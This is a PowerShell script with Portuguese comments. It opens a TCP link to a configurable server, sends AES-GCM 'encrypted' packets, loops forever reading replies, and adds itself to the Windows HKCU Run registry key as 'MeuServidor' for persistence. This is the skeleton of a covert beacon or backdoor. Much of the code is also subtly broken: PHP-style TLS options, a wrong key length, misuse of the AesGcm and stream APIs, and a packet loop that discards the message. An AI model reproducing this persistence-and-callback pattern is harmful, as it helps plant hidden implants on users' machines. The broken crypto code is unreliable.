# Configurações de conexão
$host = '127.0.0.1'        # Endereço IP do servidor remoto
$port = 443               # Porta do serviço remoto
$timeout = 10             # Tempo limite para a conexão (em segundos)

# Configuração para criptografia segura (TLS)
$contextOptions = @{
    'ssl' = @{
        'verify_peer' = $true
        'verify_peer_name' = $true
        'crypto_method' = [System.Net.Security.SslProtocols]::Tls12
    }
}
$context = [System.Net.Sockets.TcpClient]::new($host, $port)
$stream = $context.GetStream()
$stream.ReadTimeout = $timeout * 1000

if ($stream -eq $null) {
    exit
} else {
    # Configurações de criptografia AES-GCM
    $chave = 'sua-chave-secreta-de-32-bytes12345678' # 32 bytes para AES-256
    $ivTamanho = [System.Security.Cryptography.Aes]::Create().BlockSize / 8

    # Função para dividir, criptografar e enviar pacotes
    function enviarPacoteCriptografado {
        param($mensagem, $chave, $ivTamanho)
        $tamanhoPacote = 512
        $pacotes = [System.Text.Encoding]::UTF8.GetBytes($mensagem)
        $pacotes = 0..($pacotes.Length / $tamanhoPacote - 1)

        foreach ($pacote in $pacotes) {
            # Gerar um IV aleatório para cada pacote
            $iv = New-Object byte[] $ivTamanho
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)

            # Adiciona um contador ao pacote para evitar repetição
            $pacoteComNonce = $pacote + '|' + [System.Text.Encoding]::UTF8.GetString($pacotes, $pacote * $tamanhoPacote, $tamanhoPacote)

            # Criptografa com AES-256-GCM
            $tag = New-Object byte[] 16
            $encryption = [System.Security.Cryptography.AesGcm]::new($chave)
            $pacoteCriptografado = New-Object -TypeName System.IO.MemoryStream
            $encryption.Encrypt($iv, [System.Text.Encoding]::UTF8.GetBytes($pacoteComNonce), $tag, $pacoteCriptografado)

            # Anexa IV e Tag de autenticação
            $pacoteFinal = [Convert]::ToBase64String($iv + $tag + $pacoteCriptografado.ToArray())

            # Envia o pacote criptografado
            $stream.Write([Convert]::FromBase64String($pacoteFinal))
        }
    }

    # Exemplo de mensagem a ser enviada
    $mensagem = "."
    enviarPacoteCriptografado $mensagem $chave $ivTamanho

    # Manter a comunicação aberta e ler resposta do servidor enquanto estiver ativo
    while ($true) {
        $resposta = $stream.ReadLine()
        Start-Sleep -Milliseconds 100
    }

    # Fechar a conexão
    $stream.Close()
    $context.Close()
}

# Adicionar à inicialização do Windows
if ((Get-ComputerInfo).OSVersion -like "Windows*") {
    $appPath = $MyInvocation.MyCommand.Definition
    [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Microsoft\Windows\CurrentVersion\Run', $true).SetValue('MeuServidor', $appPath)
}
